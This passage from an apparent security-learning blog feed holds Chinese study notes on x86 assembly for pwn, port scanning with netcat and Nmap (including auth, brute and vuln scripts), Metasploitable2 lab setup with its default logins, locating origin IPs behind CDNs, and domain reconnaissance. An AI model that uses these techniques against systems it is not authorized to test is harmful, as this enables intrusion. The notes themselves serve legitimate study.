align="left"><strong>CF&#x3D;0,OF&#x3D;0,SF,ZF</strong></td><td align="left">清零寄存器(<code>XOR EAX, EAX</code>)</td></tr><tr><td align="left"></td><td align="left"><code>NOT</code></td><td align="left"><code>NOT 目标</code></td><td align="left">目标 &#x3D; ~目标</td><td align="left"><strong>无影响</strong></td><td align="left">位翻转</td></tr><tr><td align="left"><strong>控制转移</strong></td><td align="left"><code>CALL</code></td><td align="left"><code>CALL 地址</code></td><td align="left">1. 压入返回地址 2. 跳转到目标地址</td><td align="left"><strong>无影响</strong></td><td align="left">函数调用劫持</td></tr><tr><td align="left"></td><td align="left"><code>RET</code></td><td align="left"><code>RET [n]</code></td><td align="left">1. 弹出返回地址 2. 跳转到该地址 3. 可选栈调整</td><td align="left"><strong>无影响</strong></td><td align="left">栈溢出利用</td></tr><tr><td align="left"></td><td align="left"><code>JMP</code></td><td align="left"><code>JMP 地址</code></td><td align="left">无条件跳转</td><td align="left"><strong>无影响</strong></td><td align="left">程序流劫持</td></tr><tr><td align="left"><strong>比较测试</strong></td><td align="left"><code>CMP</code></td><td align="left"><code>CMP 操作数1, 操作数2</code></td><td align="left">设置标志位(操作数1 - 操作数2)</td><td align="left"><strong>CF,OF,SF,ZF</strong></td><td align="left">条件分支漏洞利用</td></tr><tr><td align="left"></td><td align="left"><code>TEST</code></td><td align="left"><code>TEST 操作数1, 操作数2</code></td><td align="left">设置标志位(操作数1 &amp; 操作数2)</td><td align="left"><strong>CF&#x3D;0,OF&#x3D;0,SF,ZF</strong></td><td align="left">权限检查绕过</td></tr><tr><td align="left"><strong>栈操作</strong></td><td align="left"><code>PUSH</code></td><td align="left"><code>PUSH 源</code></td><td align="left">1. ESP -&#x3D; 4&#x2F;8 2. [ESP] &#x3D; 源</td><td align="left"><strong>无影响</strong></td><td align="left">栈帧构造</td></tr><tr><td align="left"></td><td align="left"><code>POP</code></td><td align="left"><code>POP 目标</code></td><td align="left">1. 目标 &#x3D; [ESP] 2. ESP +&#x3D; 4&#x2F;8</td><td align="left"><strong>无影响</strong></td><td align="left">ROP gadget利用</td></tr><tr><td align="left"><strong>系统调用</strong></td><td align="left"><code>INT</code></td><td align="left"><code>INT n</code></td><td align="left">触发软件中断</td><td align="left"><strong>影响所有</strong></td><td align="left">系统调用利用</td></tr><tr><td align="left"></td><td align="left"><code>SYSCALL</code></td><td align="left"><code>SYSCALL</code></td><td align="left">快速系统调用</td><td align="left"><strong>影响所有</strong></td><td align="left">现代漏洞利用</td></tr></tbody></table><h3 id="关键指令深度解析"><a href="#关键指令深度解析" class="headerlink" title="关键指令深度解析"></a>关键指令深度解析</h3><h4 id="MOV-vs-LEA"><a href="#MOV-vs-LEA" class="headerlink" title="MOV vs LEA"></a>MOV vs LEA</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; MOV - 内存访问</span><br><span class="line">mov eax, [ebx]   ; 将ebx指向的内存内容加载到eax</span><br><span class="line"></span><br><span class="line">; LEA - 不访问内存</span><br><span class="line">lea eax, [ebx+8] ; 计算地址值ebx+8并存入eax（不读取内存）</span><br></pre></td></tr></table></figure><p><strong>Pwn应用</strong>：LEA常用于计算地址偏移，绕过ASLR</p><h4 id="CMP与条件跳转"><a href="#CMP与条件跳转" class="headerlink" title="CMP与条件跳转"></a>CMP与条件跳转</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmp eax, 100     ; 比较eax和100</span><br><span class="line">jg  overflow     ; 若eax &gt; 100则跳转</span><br></pre></td></tr></table></figure><p><strong>标志位关系</strong>：</p><table><thead><tr><th align="left"><strong>跳转指令</strong></th><th align="left"><strong>含义</strong></th><th align="left"><strong>检查标志</strong></th></tr></thead><tbody><tr><td align="left"><code>JE/JZ</code></td><td align="left">相等&#x2F;零</td><td align="left">ZF&#x3D;1</td></tr><tr><td align="left"><code>JNE/JNZ</code></td><td align="left">不等&#x2F;非零</td><td align="left">ZF&#x3D;0</td></tr><tr><td align="left"><code>JG/JNLE</code></td><td align="left">大于</td><td align="left">ZF&#x3D;0且SF&#x3D;OF</td></tr><tr><td align="left"><code>JL/JNGE</code></td><td align="left">小于</td><td align="left">SF≠OF</td></tr></tbody></table><h4 id="CALL-RET-机制"><a href="#CALL-RET-机制" class="headerlink" title="CALL-RET 机制"></a>CALL-RET 机制</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call func:   ; 相当于</span><br><span class="line">  push eip+5 ; 压入返回地址(下条指令)</span><br><span class="line">  jmp func</span><br><span class="line"></span><br><span class="line">ret:        ; 相当于</span><br><span class="line">  pop eip   ; 弹出返回地址到EIP</span><br></pre></td></tr></table></figure><p><strong>漏洞利用</strong>：缓冲区溢出覆盖返回地址</p><h4 id="栈操作指令"><a href="#栈操作指令" class="headerlink" title="栈操作指令"></a>栈操作指令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 函数序言</span><br><span class="line">push ebp</span><br><span class="line">mov ebp, esp</span><br><span class="line"></span><br><span class="line">; 函数尾声</span><br><span class="line">mov esp, ebp</span><br><span class="line">pop ebp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p><strong>Pwn意义</strong>：栈帧结构是缓冲区溢出的基础</p><h4 id="TEST指令妙用"><a href="#TEST指令妙用" class="headerlink" title="TEST指令妙用"></a>TEST指令妙用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test eax, eax  ; 检查eax是否为0</span><br><span class="line">jz   exit      ; 为零则跳转</span><br><span class="line"></span><br><span class="line">test al, 1     ; 检查最低位</span><br><span class="line">jnz  odd       ; 为奇数则跳转</span><br></pre></td></tr></table></figure><h3 id="汇编与高级语言的对应关系"><a href="#汇编与高级语言的对应关系" class="headerlink" title="汇编与高级语言的对应关系"></a>汇编与高级语言的对应关系</h3><p> C 语言与汇编（x86-64）的简单映射示例：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> result = add(<span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; add函数</span><br><span class="line">add:</span><br><span class="line">    MOV EAX, ECX      ; 第一个参数(a)从ECX移入EAX</span><br><span class="line">    ADD EAX, EDX      ; EAX += 第二个参数(b)</span><br><span class="line">    RET               ; 返回EAX的值</span><br><span class="line"></span><br><span class="line">; main函数</span><br><span class="line">main:</span><br><span class="line">    MOV ECX, 3        ; 第一个参数3存入ECX</span><br><span class="line">    MOV EDX, 4        ; 第二个参数4存入EDX</span><br><span class="line">    CALL add          ; 调用add函数</span><br><span class="line">    XOR EAX, EAX      ; EAX = 0（返回值）</span><br><span class="line">    RET</span><br></pre></td></tr></table></figure><p>第一二章 前言-汇编的概念：<a href="http://fynote.com/s/3251">http://fynote.com/s/3251</a><br>第三章 寄存器：<a href="http://fynote.com/s/3269">http://fynote.com/s/3269</a><br>第四章 汇编程序：<a href="http://fynote.com/s/3315">http://fynote.com/s/3315</a><br>第五章 汇编指令：<a href="http://fynote.com/s/3354">http://fynote.com/s/3354</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;装载&quot;&gt;&lt;a href=&quot;#装载&quot; class=&quot;headerlink&quot; title=&quot;装载&quot;&gt;&lt;/a&gt;装载&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/../../../../../images/image-20250630141153683.png&quot; alt=&quot;ima</summary>
      
    
    
    
    <category term="PWN" scheme="https://rhea006.github.io/categories/PWN/"/>
    
    <category term="Learning" scheme="https://rhea006.github.io/categories/PWN/Learning/"/>
    
    <category term="2-汇编基础" scheme="https://rhea006.github.io/categories/PWN/Learning/2-%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/"/>
    
    <category term="x86x64汇编基础" scheme="https://rhea006.github.io/categories/PWN/Learning/2-%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/x86x64%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/"/>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://rhea006.github.io/2025/06/2167c014e2bb.html"/>
    <id>https://rhea006.github.io/2025/06/2167c014e2bb.html</id>
    <published>2025-06-29T05:57:20.304Z</published>
    <updated>2025-06-30T04:13:35.567Z</updated>
    
    <content type="html"><![CDATA[<p>title: 端口服务信息<br>date: 2025-06-29 20:16:36<br>categories:<br>tags: -渗透测试</p><h1 id="扫描的思路和代码实现"><a href="#扫描的思路和代码实现" class="headerlink" title="扫描的思路和代码实现"></a>扫描的思路和代码实现</h1><h2 id="一个服务一个端口"><a href="#一个服务一个端口" class="headerlink" title="一个服务一个端口"></a>一个服务一个端口</h2><h2 id="查看本机端口信息"><a href="#查看本机端口信息" class="headerlink" title="查看本机端口信息"></a>查看本机端口信息</h2><h6 id="windows"><a href="#windows" class="headerlink" title="windows:"></a>windows:</h6><p>netstat -aon|findstr 3306</p><h6 id="Linux"><a href="#Linux" class="headerlink" title="Linux:"></a>Linux:</h6><p>netstat -an|grep 3306</p><p>若未显示结果，说明对应服务未启动（如示例中的MySQL和80端口服务）</p><h2 id="远程机器端口"><a href="#远程机器端口" class="headerlink" title="远程机器端口"></a>远程机器端口</h2><p>telnet 192.168.142.130 80</p><p>wget 192.168.142.130 80</p><p>nc -vz 192.168.142.130 445</p><p>python代码扫描 wscan.py（批量扫描）</p><p>nc -vz 192.168.142.130 80-9000（netcat有扫描功能，能显示服务名称）</p><h1 id="常见端口"><a href="#常见端口" class="headerlink" title="常见端口"></a>常见端口</h1><p><a href="https://nsrc.org/workshops/2009/summer/presentations/day3/common-ports.pdf">(Cheat Sheet - Common Ports)</a></p><h2 id="文件共享服务"><a href="#文件共享服务" class="headerlink" title="文件共享服务"></a>文件共享服务</h2><p>21&#x2F;22&#x2F;69：FTP&#x2F;SFTP文件传输协议<br>2049：NFS服务（Network File System）<br>139：Samba服务<br>389：LDAP目录访问协议（Light Directory Access Portocol）</p><h2 id="远程连接服务"><a href="#远程连接服务" class="headerlink" title="远程连接服务"></a>远程连接服务</h2><p>22：SSH远程连接<br>23：Telnet远程连接<br>3389：RDP远程桌面连接<br>5900：VNC远程连接<br>5632：PcAnywhere远程控制服务</p><h2 id="Web应用服务"><a href="#Web应用服务" class="headerlink" title="Web应用服务"></a>Web应用服务</h2><p>80&#x2F;443&#x2F;8080：常见的web服务端口<br>7001&#x2F;7002：Weblogic控制台<br>8080&#x2F;8089：Jboss&#x2F;resin&#x2F;jetty&#x2F;Jenkins</p><p>9090：Websphere控制台<br>4848：Glassfish控制台<br>1352：Lotus domino邮件服务<br>10000：Webmin-web控制面板</p><h2 id="数据库服务"><a href="#数据库服务" class="headerlink" title="数据库服务"></a>数据库服务</h2><p>3306：MySQL<br>1433：MSSQL数据库<br>1521：Oracle数据库<br>5432：PostgreSQL数据库<br>27017&#x2F;27018：MongoDB<br>6379：Redis数据库<br>5000：Sysbase&#x2F;DB2数据库</p><h2 id="邮件服务"><a href="#邮件服务" class="headerlink" title="邮件服务"></a>邮件服务</h2><p>25：SMTP邮件服务<br>110：POP3协议<br>143：IMAP协议</p><h2 id="网络常见协议"><a href="#网络常见协议" class="headerlink" title="网络常见协议"></a>网络常见协议</h2><p>53：DNS域名系统<br>67&#x2F;68：DHCP服务<br>161：SNMP协议</p><h2 id="特殊服务"><a href="#特殊服务" class="headerlink" title="特殊服务"></a>特殊服务</h2><p>2181：Zookeeper服务<br>8069：Zabbix服务<br>9200&#x2F;9300：Elasticsearch服务<br>11211：Memcached服务<br>512&#x2F;513&#x2F;514：Linux Rexec服务<br>873：Rsync服务<br>3690：SVN服务<br>50000：SAP Management Console</p><h1 id="metasploitable2靶机"><a href="#metasploitable2靶机" class="headerlink" title="metasploitable2靶机"></a>metasploitable2靶机</h1><p>链接：<a href="https://pan.baidu.com/s/1u-MTtxATAfhE5ELnhCS-Fg">https://pan.baidu.com/s/1u-MTtxATAfhE5ELnhCS-Fg</a><br>提取码：8888 </p><p>下载、解压、导入VM<br>默认用户名密码 msfadmin&#x2F;msfadmin<br>修改root密码 sudo passwd root<br>ifconfig查看IP</p><h1 id="端口扫描工具NMap（Network-Mapper）"><a href="#端口扫描工具NMap（Network-Mapper）" class="headerlink" title="端口扫描工具NMap（Network Mapper）"></a>端口扫描工具NMap（Network Mapper）</h1><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><p><a href="https://nmap.org/">Nmap：网络映射器 - 免费的安全扫描程序</a></p><p>图形界面：zenmap</p><p>主要功能<br>1）扫描主机(Host Discovery)<br>2）扫描端口(Port Scanning)<br>3）探测操作系统、软件版本 (Operating System Detection、Version Detection)</p><h2 id="参数分类"><a href="#参数分类" class="headerlink" title="参数分类"></a>参数分类</h2><p><a href="https://nmap.org/book/man.html">第 15 章.Nmap 参考指南 |Nmap 网络扫描</a></p><p>nmap –help</p><p>TARGET SPECIFICATION:目标，对什么进行扫描，比如是域名、IP或者网络<br>HOST DISCOVERY:主机发现，怎么对主机进行扫描，比如简单扫描，还是全部扫一遍，或者用<br>相应的协议扫<br>SCAN TECHNIQUES:扫描技术，协议的设置<br>PORT SPECIFICATION AND SCAN ORDER:端口和扫描顺序设置<br>SERVICE&#x2F;VERSION DETECTION:服务和版本识别<br>SCRIPT SCAN:使用脚本，nmap本身内置了大量的lua脚本，而且还可以自己编写脚本</p><p>【nmap本身内置了大量的lua脚本，而且还可以自己编写脚本<br>ls &#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts&#x2F; | wc -l<br>全部清单：<a href="https://nmap.org/nsedoc/index.html">https://nmap.org/nsedoc/index.html</a><br>例如：<br>nmap 192.168.142.137 –script http-enum 列举HTTP服务<br>nmap –script&#x3D;auth 绕过鉴权<br>nmap –script&#x3D;brute 暴力破解<br>nmap –script&#x3D;vuln 扫描漏洞】</p><p>OS DETECTION:操作系统识别<br>TIMING AND PERFORMANCE:时间和性能设置，比如扫描频率、重试次数等等<br>FIREWALL&#x2F;IDS EVASION AND SPOOFING:防火墙绕过和欺骗，比如使用代理，假IP等<br>OUTPUT:把扫描接出输出到文件<br>MISC: 杂项：启用IPv6等等配置参数示例</p><h2 id="参数示例"><a href="#参数示例" class="headerlink" title="参数示例"></a>参数示例</h2><p>nmap 192.168.142.133 # metasploitable2 Linux</p><p><a href="http://testfire.net/">http://testfire.net/</a></p><p>nmap testfire.net           # IBM的一个靶场<br>简单扫描：nmap -sP 192.168.142.133<br>指定端口或范围扫描： nmap -p0-65535 192.168.142.133<br>探测操作系统： nmap -O 192.168.142.133</p><p>【cat &#x2F;proc&#x2F;version】</p><p>只进行主机发现，不进行端口扫描： nmap -sn 192.168.40.195&#x2F;24</p><h6 id="IP后面的-24是什么意思？"><a href="#IP后面的-24是什么意思？" class="headerlink" title="IP后面的&#x2F;24是什么意思？"></a>IP后面的&#x2F;24是什么意思？</h6><p>&#x2F;24含义: IP地址后的&#x2F;24表示子网掩码的位数为24位，即255.255.255.0，属于C类IP地址。</p><p>掩码的位数。<br>子网掩码8位，11111111.00000000.00000000.00000000 代表：255.0.0.0（A类IP地址）<br>子网掩码16位，11111111.11111111.00000000.00000000 代表：255.255.0.0（B类IP地址）<br>子网掩码24位，11111111.11111111.11111111.00000000 代表：255.255.255.0（C类IP地址）<br>旁站：和目标网站在同一台服务器但端口不同的其他网站。<br>C段 ：和目标服务器IP处在同一个C段的其它服务器。</p><h2 id="界面工具Zenmap"><a href="#界面工具Zenmap" class="headerlink" title="界面工具Zenmap"></a>界面工具Zenmap</h2><p>第一种：Intense scan<br>第二种：Intense scan plus UDP<br>第三种：Intense scan,all TCP ports<br>第四种：Intense scan,no ping<br>第五种：Ping scan<br>第六种：Quick scan<br>第七种：Quick scan plus<br>第八种：Quick traceroute<br>第九种：Regular scan<br>第十种：Slow comprehensive scan</p><h1 id="其他扫描工具"><a href="#其他扫描工具" class="headerlink" title="其他扫描工具"></a>其他扫描工具</h1><p>masscan、nbtscan<br><a href="http://coolaf.com/tool/port">在线端口检测,端口扫描,端口开放检查-在线工具-postjson</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;title: 端口服务信息&lt;br&gt;date: 2025-06-29 20:16:36&lt;br&gt;categories:&lt;br&gt;tags: -渗透测试&lt;/p&gt;
&lt;h1 id=&quot;扫描的思路和代码实现&quot;&gt;&lt;a href=&quot;#扫描的思路和代码实现&quot; class=&quot;headerlink&quot;</summary>
      
    
    
    
    <category term="Penetration Test" scheme="https://rhea006.github.io/categories/Penetration-Test/"/>
    
    <category term="信息收集" scheme="https://rhea006.github.io/categories/Penetration-Test/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://rhea006.github.io/2025/06/17f7e2087847.html"/>
    <id>https://rhea006.github.io/2025/06/17f7e2087847.html</id>
    <published>2025-06-29T04:55:03.925Z</published>
    <updated>2025-06-30T04:13:35.565Z</updated>
    
    <content type="html"><![CDATA[<p>title: IP信息<br>date: 2025-06-28 20:16:36<br>categories:<br>tags: -渗透测试</p><h1 id="DNS服务器的类型"><a href="#DNS服务器的类型" class="headerlink" title="DNS服务器的类型"></a>DNS服务器的类型</h1><ul><li>本地域名服务器: 在网络适配器中配置的服务器地址，如114.114.114.114或8.8.8.8，可能是路由器地址。</li><li>根域名服务器: 负责全球域名的解析，如.com、.net等顶级域名的管理。</li><li>顶级域名服务器: 解析我们注册的一级域名（实际上是二级域名，因为.com等才是一级域名）。</li><li>授权域名服务器: 解析三级域名（实际上是四级域名），如blog.wuya.com，知道配置记录指向的IP。</li></ul><h2 id="查询方式："><a href="#查询方式：" class="headerlink" title="查询方式："></a>查询方式：</h2><ul><li>迭代查询: 本地域名服务器依次查询根域名服务器、顶级域名服务器、授权域名服务器。</li><li>递归查询: 本地域名服务器帮助查询，层层返回结果。</li></ul><p><img src="/./../../../images/image-20250629130717006.png" alt="image-20250629130717006"></p><h1 id="ping-nslookup"><a href="#ping-nslookup" class="headerlink" title="ping &#x2F; nslookup"></a>ping &#x2F; nslookup</h1><h2 id="Packet-Internet-Groper（因特网包探索器）："><a href="#Packet-Internet-Groper（因特网包探索器）：" class="headerlink" title="Packet Internet Groper（因特网包探索器）："></a>Packet Internet Groper（因特网包探索器）：</h2><p>用于检测网络通畅性，也可根据域名获得服务器IP。</p><h2 id="nslookup工具"><a href="#nslookup工具" class="headerlink" title="nslookup工具:"></a>nslookup工具:</h2><p>也可用于查询域名对应的IP，可指定查询类型，如MX记录（邮件交换记录）。</p><p>nslookup -type&#x3D;”MX” baidu.com</p><h1 id="IP归属信息"><a href="#IP归属信息" class="headerlink" title="IP归属信息"></a>IP归属信息</h1><p><a href="http://ipwhois.cnnic.net.cn/">http://ipwhois.cnnic.net.cn/</a></p><p><a href="https://www.ip38.com/">iP地址查询 - iP38查询网</a></p><p>进行IP归属查询，可查询IPv4&#x2F;IPv6地址、AS号码、网络名称等信息。</p><p>运营商：显示为”China Mobile Communications Corporation”，即中国移动</p><p>IP段范围：</p><p>地理位置：</p><p>管理联系人：</p><h1 id="如何获取CDN背后的真实IP"><a href="#如何获取CDN背后的真实IP" class="headerlink" title="如何获取CDN背后的真实IP"></a>如何获取CDN背后的真实IP</h1><h2 id="CDN-Content-Delivery-Network-内容分发网络"><a href="#CDN-Content-Delivery-Network-内容分发网络" class="headerlink" title="CDN(Content Delivery Network)内容分发网络"></a>CDN(Content Delivery Network)内容分发网络</h2><h4 id="使用CDN服务-将相同内容部署在多台服务器上，形成源站-多个节点服务器的架构。"><a href="#使用CDN服务-将相同内容部署在多台服务器上，形成源站-多个节点服务器的架构。" class="headerlink" title="使用CDN服务 :将相同内容部署在多台服务器上，形成源站+多个节点服务器的架构。"></a>使用CDN服务 :将相同内容部署在多台服务器上，形成源站+多个节点服务器的架构。</h4><p>优势：</p><ul><li>负载均衡：分摊访问请求，减少单台服务器压力</li><li>加速访问：用户访问最近的节点服务器，缩短物理距离，提升响应速度（如武汉用户访问武汉服务器比北京服务器更快）</li><li>应用案例：淘宝早期就采用CDN技术处理商品图片等静态内容</li></ul><h2 id="实现流程（以阿里云为例）"><a href="#实现流程（以阿里云为例）" class="headerlink" title="实现流程（以阿里云为例）"></a>实现流程（以阿里云为例）</h2><p><a href="https://www.zhihu.com/question/36514327/answer/1604554133">https://www.zhihu.com/question/36514327/answer/1604554133</a></p><ol><li>当终端用户（北京）向<a href="http://www.a.com下的指定资源发起请求时,首先/">www.a.com下的指定资源发起请求时，首先</a><br>向LDNS（本地DNS）发起域名解析请求。</li><li>LDNS检查缓存中是否有<a href="http://www.a.com的ip地址记录.如果有,则直/">www.a.com的IP地址记录。如果有，则直</a><br>接返回给终端用户；如果没有，则向授权DNS查询。</li><li>当授权DNS解析<a href="http://www.a.com时,返回域名cname/">www.a.com时，返回域名CNAME</a><br><a href="http://www.a.tbcdn.com对应ip地址./">www.a.tbcdn.com对应IP地址。</a></li><li>域名解析请求发送至阿里云DNS调度系统，并为请求分配最佳节点<br>IP地址。</li><li>LDNS获取DNS返回的解析IP地址。</li><li>用户获取解析IP地址。</li><li>用户向获取的IP地址发起对该资源的访问请求。</li></ol><h2 id="如何找出真实IP"><a href="#如何找出真实IP" class="headerlink" title="如何找出真实IP"></a>如何找出真实IP</h2><p><img src="/./../../../images/image-20250629133105891.png" alt="image-20250629133105891"></p><p>CDN会隐藏真实服务器IP，需要通过特殊技术手段获取</p><h3 id="1、超级ping"><a href="#1、超级ping" class="headerlink" title="1、超级ping"></a>1、超级ping</h3><h3 id="2、历史DNS"><a href="#2、历史DNS" class="headerlink" title="2、历史DNS"></a>2、历史DNS</h3><p><a href="https://tools.ipip.net/cdn.php">全球 CDN 服务商查询_专业精准的IP库服务商_IPIP</a></p><p><a href="https://sitereport.netcraft.com/">该网站正在运行什么？|网络工艺</a></p><h3 id="3、通过子域名查询IP"><a href="#3、通过子域名查询IP" class="headerlink" title="3、通过子域名查询IP"></a>3、通过子域名查询IP</h3><h3 id="4、国外主机解析"><a href="#4、国外主机解析" class="headerlink" title="4、国外主机解析"></a>4、国外主机解析</h3><p>原理：部分网站未部署海外CDN节点，国外访问可能直连源站</p><p>工具：</p><ul><li><a href="https://www.webpagetest.org/">WebPageTest - 网站性能和优化测试</a></li><li><a href="https://dnscheck.pingdom.com/">网站速度测试 |Pingdom 工具</a></li><li><a href="https://www.host-tracker.com/en">网站正常运行时间监控服务，检查网站是否关闭 - Host-tracker</a></li></ul><h3 id="5、其他"><a href="#5、其他" class="headerlink" title="5、其他"></a>5、其他</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;title: IP信息&lt;br&gt;date: 2025-06-28 20:16:36&lt;br&gt;categories:&lt;br&gt;tags: -渗透测试&lt;/p&gt;
&lt;h1 id=&quot;DNS服务器的类型&quot;&gt;&lt;a href=&quot;#DNS服务器的类型&quot; class=&quot;headerlink&quot; tit</summary>
      
    
    
    
    <category term="Penetration Test" scheme="https://rhea006.github.io/categories/Penetration-Test/"/>
    
    <category term="信息收集" scheme="https://rhea006.github.io/categories/Penetration-Test/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
  </entry>
  
  <entry>
    <title>域名信息收集</title>
    <link href="https://rhea006.github.io/2025/06/a2f5477bcf25.html"/>
    <id>https://rhea006.github.io/2025/06/a2f5477bcf25.html</id>
    <published>2025-06-28T12:16:36.000Z</published>
    <updated>2025-06-30T04:13:35.565Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-域名是什么"><a href="#1-域名是什么" class="headerlink" title="1.域名是什么?"></a>1.域名是什么?</h1><p>用来代替IP，找到网络上的一台计算机</p><p><img src="/./../../../images/image-20250628152826187.png" alt="image-20250628152826187"></p><h1 id="2-域名的分类："><a href="#2-域名的分类：" class="headerlink" title="2.域名的分类："></a>2.域名的分类：</h1><h3 id="国际域名"><a href="#国际域名" class="headerlink" title="国际域名:"></a>国际域名:</h3><p>.com(商业公司);.net(网络服务);.org(组织协会等);.gov(政府部);.edu(教育机构);.mil(军事领域);.int(国际组织)</p><h3 id="国别域名"><a href="#国别域名" class="headerlink" title="国别域名:"></a>国别域名:</h3><p>.CN代表中国，.UK代表英国，.US代表美国</p><h3 id="新顶级域名"><a href="#新顶级域名" class="headerlink" title="新顶级域名:"></a>新顶级域名:</h3><p>biz,info，name，pro，aero,coop, museum..</p><h1 id="3-域名联系人信息"><a href="#3-域名联系人信息" class="headerlink" title="3.域名联系人信息"></a>3.域名联系人信息</h1><p>所属人、邮箱、电话、地址…..</p><p><a href="https://site.ip138.com/dbcha.com/domain.htm">dbcha.com子域名大全 dbcha.com二级域名 dbcha.com域名解析查询</a></p><h3 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h3><p>.com由域名运营商VeriSign 管理</p><p>cn域名由CNNIC 管理</p><h4 id="whois工具"><a href="#whois工具" class="headerlink" title="whois工具"></a>whois工具</h4><p><a href="https://whois.chinaz.com/">https://whois.chinaz.com</a><br><a href="http://whoissoft.com/">http://whoissoft.com</a><br><a href="https://whois.cnnic.cn/WelcomeServlet">https://whois.cnnic.cn/WelcomeServlet</a><br>kali whois命令</p><p><img src="/./../../../images/image-20250629091525995.png" alt="image-20250629091525995"></p><h3 id="域名反查"><a href="#域名反查" class="headerlink" title="域名反查"></a>域名反查</h3><p><a href="http://whois.chinaz.com/reverse">http://whois.chinaz.com/reverse</a></p><h3 id="ICP备案查询"><a href="#ICP备案查询" class="headerlink" title="ICP备案查询"></a>ICP备案查询</h3><h3 id="企业信息查询"><a href="#企业信息查询" class="headerlink" title="企业信息查询"></a>企业信息查询</h3><p>官方渠道：beian.miit.gov.cn</p><p>工具：天眼查、企查查等</p><p>查询方式：输入单位名称&#x2F;域名&#x2F;备案号</p><p>备案号规则：个人唯一，多个网站使用”-1”,”-2”等后缀</p><h1 id="4-子域名信息"><a href="#4-子域名信息" class="headerlink" title="4.子域名信息"></a>4.子域名信息</h1><h3 id="子域名的作用"><a href="#子域名的作用" class="headerlink" title="子域名的作用"></a>子域名的作用</h3><h4 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h4><p>子域名是主域名下的二级域名，格式为”子域名.主域名”，如news.baidu.com</p><h4 id="作用原理："><a href="#作用原理：" class="headerlink" title="作用原理："></a>作用原理：</h4><p>·资源隔离：可将不同服务部署在不同服务器（如news.baidu.com和map.baidu.com指向不同IP）</p><p>·品牌统一：保持同一品牌下的多产品线（如百度新闻、百度地图）</p><p>·零成本扩展：无需额外注册新域名，理论上子域名数量无限制</p><h4 id="对比方案："><a href="#对比方案：" class="headerlink" title="对比方案："></a>对比方案：</h4><p>·子目录方案：如<a href="http://www.baidu.com/news%EF%BC%88%E6%89%80%E6%9C%89%E6%9C%8D%E5%8A%A1%E5%85%B1%E4%BA%AB%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%B5%84%E6%BA%90%EF%BC%8C%E6%80%A7%E8%83%BD%E5%8F%97%E9%99%90%EF%BC%89">www.baidu.com/news（所有服务共享服务器资源，性能受限）</a></p><p>·独立域名方案：如bdnews.com（注册管理成本高）</p><h3 id="怎么查询子域名？"><a href="#怎么查询子域名？" class="headerlink" title="怎么查询子域名？"></a>怎么查询子域名？</h3><h4 id="1、字典猜解："><a href="#1、字典猜解：" class="headerlink" title="1、字典猜解："></a>1、字典猜解：</h4><p>使用常见子名字典（如oa、crm、bbs等前缀）</p><h4 id="2、暴力枚举："><a href="#2、暴力枚举：" class="headerlink" title="2、暴力枚举："></a>2、暴力枚举：</h4><p>从a-z、0-9组合尝试（1位→多位）</p><h4 id="3、技术实现："><a href="#3、技术实现：" class="headerlink" title="3、技术实现："></a>3、技术实现：</h4><p>·端口探测：默认扫描80(http)和443(https)端口</p><p>·状态检测：通过HTTP响应码判断服务可用性（200&#x2F;302为有效）</p><p><a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></p><h1 id="5-域名DNS信息"><a href="#5-域名DNS信息" class="headerlink" title="5.域名DNS信息"></a>5.域名DNS信息</h1><h3 id="1-域名与IP"><a href="#1-域名与IP" class="headerlink" title="1. 域名与IP"></a>1. 域名与IP</h3><h4 id="DNS本质："><a href="#DNS本质：" class="headerlink" title="DNS本质："></a>DNS本质：</h4><p>DNS(Domain Name Server)是将域名映射为IP地址的解析服务，本质是一个记录域名与IP映射关系的分布式数据库。</p><h4 id="工作原理："><a href="#工作原理：" class="headerlink" title="工作原理："></a>工作原理：</h4><p>当用户访问域名时，DNS服务会查询其数据库中的映射表，将域名转换为对应的IP地址。</p><h3 id="2-域名解析信息"><a href="#2-域名解析信息" class="headerlink" title="2. 域名解析信息"></a>2. 域名解析信息</h3><h4 id="配置流程："><a href="#配置流程：" class="headerlink" title="配置流程："></a>配置流程：</h4><p>在域名注册商处设置DNS服务器（如DNSPod）</p><p>在DNS服务平台配置具体解析规则</p><p><img src="/./../../../images/image-20250629100748277.png" alt="image-20250629100748277"></p><h4 id="配置示例："><a href="#配置示例：" class="headerlink" title="配置示例："></a>配置示例：</h4><p>@符号代表所有地址</p><p>www代表特定子域名</p><p>一个域名可配置多条不同类型记录</p><h4 id="记录类型"><a href="#记录类型" class="headerlink" 